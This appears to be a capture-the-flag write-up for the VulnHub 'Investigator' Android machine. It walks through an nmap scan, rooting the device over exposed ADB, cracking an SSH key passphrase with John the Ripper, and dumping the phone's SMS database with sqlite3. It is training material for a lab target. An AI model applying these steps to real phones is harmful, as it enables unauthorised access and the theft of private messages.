---
title: "Investigator VulnHub CTF writeup"
---

#### nmap Service scan
{% highlight terminal%}
┌──(kali㉿kali)-[~]
└─$ nmap -p- -sC 192.168.56.164                                                130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-19 09:29 EDT
Nmap scan report for 192.168.56.164
Host is up (0.00099s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
5555/tcp  open  freeciv
8080/tcp  open  http-proxy
|_http-title: Welcome To  UnderGround Sector
22000/tcp open  snapenetio
{% endhighlight %}

This device is an android phone. The services running are as follows: 
{% highlight text %}
5555 Android Debug Bridge over the network
22000 DropBear SSH server 
{% endhighlight %}
[freeciv explaination](https://github.com/nmap/nmap/issues/1276)

From the http-proxy server webpage:
{% highlight text %}
Agent 's' have been investigate the case but he fail to completed it !!
We Don't Know what happens to Agent "S"
Sector need your help to investigate this case
Last information from Agent "S" is only 6666666666 no other information,find and solver it
{% endhighlight %}

Firstly we'll need to install the platform tools to use ADB. 
go [here](https://developer.android.com/studio/releases/platform-tools) and download
the linux zip file. We just need to unzip the platform tools and away we go. 

#### Connecting to the device

This will start the ADB server on our host and connect to the device:  
{% highlight terminal%}
./adb connect 192.168.56.164:5555
{% endhighlight %}

Getting a shell on the device:
{% highlight terminal%}
./adb shell
{% endhighlight %}

Getting root on the device:
{% highlight terminal%}
su root
{% endhighlight %}

#### Getting the root flag.txt

Traversing to the data/root directory for the first flag:
{% highlight terminal%}
uid=0(root) gid=0(root)@x86:/data/root # cat flag.txt                          
Great Move !!! 

Itz a easy one right ???

lets make this one lil hard


You flag is not here  !!!     


Agent "S"   Your Secret Key ---------------->259148637
{% endhighlight %}

#### enumerating the other services on the device

We'll enumerate the services by looking in the `sdcard` directory:

{% highlight terminal%}
uid=0(root) gid=0(root)@x86:/sdcard # ls -a                                    
Alarms
Android
Boot_Shell
DCIM
Download
Movies
Music
Notifications
Pictures
Podcasts
Ringtones
htdocs
kickwebinfo
obb
ssh
storage
www
{% endhighlight %}

`www` and `ssh` look interesting, we'll do `www` first to see if that's the HTTP
server root directory: 

{% highlight terminal%}
uid=0(root) gid=0(root)@x86:/sdcard/www/public # ls -asl
total 28
-rw-rw---- root     sdcard_r       13 2017-12-10 20:06 .htaccess
drwxrwx--- root     sdcard_r          2018-04-04 00:29 announce
-rw-rw---- root     sdcard_r       18 2018-04-04 13:50 backdoor.php
drwxrwx--- root     sdcard_r          2018-04-04 18:38 backup
drwxrwx--- root     sdcard_r          2018-04-04 18:37 hello
-rw-rw---- root     sdcard_r      607 2020-07-03 18:43 index.html
drwxrwx--- root     sdcard_r          2018-04-04 00:31 secret22000

{% endhighlight %}

A couple of fake backdoors and an RSA private key which we're going to crack using 
[this method](https://www.techregister.co.uk/how-to-crack-ssh-private-key-passwords-with-john-the-ripper-null-byte-wonderhowto/).


{% highlight terminal%}
┌──(kali㉿kali)-[~/ctfs/investigator]
└─$ python ssh2john.py touhid.key > touhid.hash

┌──(kali㉿kali)-[~/ctfs/investigator]
└─$ john touhid.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
qwerty           (touhid.key)
1g 0:00:00:05 DONE (2021-04-19 11:10) 0.1700g/s 2439Kp/s 2439Kc/s 2439KC/sa6_123..*7¡Vamos!
Session completed

{% endhighlight %}

Now we can use the key to login over ssh:

{% highlight terminal%}
┌──(kali㉿kali)-[~/ctfs/investigator]
└─$ chmod 600 touhid.key                                                                                                                                            255 ⨯
┌──(kali㉿kali)-[~/ctfs/investigator]
└─$ ssh -i touhid.key 192.168.56.164 -p 22000
{% endhighlight %}

now we can switch to root and ditch ADB for the remainder of the walkthrough

#### Dumping the SMS database
I'll be dumping the SMS messages by using the following as a [guide](https://android.stackexchange.com/questions/11619/android-read-recent-sms-messages-from-command-line).

[Here's another useful guide](https://manios.org/2013/10/28/read-sms-directly-from-sqlite-database-in-android).

{% highlight terminal%}
2|uid=0(root) gid=0(root)@x86:/data/data/com.android.providers.telephony/databases # sqlite3 mmssms.db
{% endhighlight %}

{% highlight terminal%}
sqlite> select address, body from sms;
(999) 999-9999|Welcome to  investigator 
(999) 999-9999|Your flag is in next chat
(999) 999-9999|welcome to investigator
(888) 888-8888|welcome to investigator
(888) 888-8888|your flag is not here
(888) 888-8888|welcome to investigator
(777) 777-7777|welcome to investigator
(777) 777-7777|your flag is not  here
(666) 666-6666|welcome to investigator
(666) 666-6666|share your screen shot in  telegram ------------ telegram group link ------------->https://t.me/joinchat/MnPu-hwn_MMS5sX0jngsoQ
(666) 666-6666|if the above link is not working share your screenshot at twitter -------->twitter id ------->@sivanes90967948
(666) 666-6666|welcome to investigator
(555) 555-5555|welcome to investigator
(555) 555-5555|no flag
(555) 555-5555|welcome to investigator
(444) 444-4444|welcome to investigator
(444) 444-4444|no flag
(444) 444-4444|welcome to investigator
(333) 333-3333|welcome to investigator
(333) 333-3333|no flag
(333) 333-3333|welcome to investigator
(222) 222-2222|welcome to investigator
(222) 222-2222|no flag
(222) 222-2222|welcome to investigator
1111-111-111|welcome to investigator
1111-111-111|no flag
1111-111-111|welcome to investigator
(000) 000-0000|welcome to investigator
(000) 000-0000|no flag
(000) 000-0000|welcome to investigator
(777) 777-7777|welcome to investigator
sqlite>
{% endhighlight %}

Where the number is `(666) 666-666` is where the flag intended "root" flag is.
